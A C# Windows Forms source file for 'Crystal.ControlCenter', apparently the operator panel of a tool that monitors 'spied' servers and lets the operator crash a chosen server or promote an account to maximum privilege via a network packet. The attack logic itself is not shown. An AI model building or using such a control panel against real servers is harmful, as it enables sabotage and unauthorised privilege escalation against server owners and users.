using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Crystal.ControlCenter
{
    public partial class ControlCenterForm : Form
    {
        public ControlCenterForm()
        {
            InitializeComponent();
        }

        private void ControlCenterForm_Load(object sender, EventArgs e)
        {
            Controller.LogIT("Serveur en cours de lancement .." , Color.Green);
            Controller.Start();
        }

        private void actualiséToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var server in Controller.ServersSpyed.ToArray())
            {
                server.RequestInformations();
            }

            Controller.LogIT("Actualisation ..", Color.Green);
        }

        private CrystalServer GetCurrentSelectedServer()
        {
            try
            {
                return Controller.ServersSpyed[dataGridView1.SelectedRows[0].Index];
            }
            catch { return null; }
        }

        private void crasherLeServeurToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var server = GetCurrentSelectedServer();
            if (server != null)
            {
                server.Crash();
            }
        }

        private void promouvoirUnCompteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var server = GetCurrentSelectedServer();
            if (server != null)
            {
                var result = Interaction.InputBox("Entrer le nom de compte", "Promouvoir un compte");
                server.Send(new Network.Packets.PromoteAccountPacket(result, int.MaxValue));
                Controller.LogIT("Demande de promotion envoyé !", Color.Green);
            }
        }
    }
}
